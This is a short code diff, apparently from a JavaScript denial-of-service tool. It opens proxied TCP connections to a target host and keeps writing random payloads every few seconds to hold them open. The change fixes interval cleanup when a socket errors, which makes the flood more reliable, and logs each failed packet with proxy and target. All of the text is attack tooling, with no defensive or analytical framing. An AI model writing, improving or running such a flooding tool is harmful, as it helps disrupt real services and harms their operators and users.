@@ -19,6 +19,7 @@ const startAttack = () => {
 
   const sendPacket = async (proxy) => {
     const socket = createTcpClient(proxy, { host: targetHost, port: port });
+    let writeInterval = null;
 
     socket.on("connect", () => {
       totalPackets++;
@@ -28,16 +29,20 @@ const startAttack = () => {
         totalPackets,
       });
 
-      const interval = setInterval(() => {
+      writeInterval = setInterval(() => {
         if (socket.writable && socket["open"]) {
           socket.write(randomString(packetSize));
         } else {
-          clearInterval(interval);
+          clearInterval(writeInterval);
         }
       }, 3000);
     });
 
     socket.on("error", (err) => {
+      socket["open"] = false;
+      if (writeInterval) {
+        clearInterval(writeInterval);
+      }
       parentPort.postMessage({
         log: `❌ Packet failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
         totalPackets,
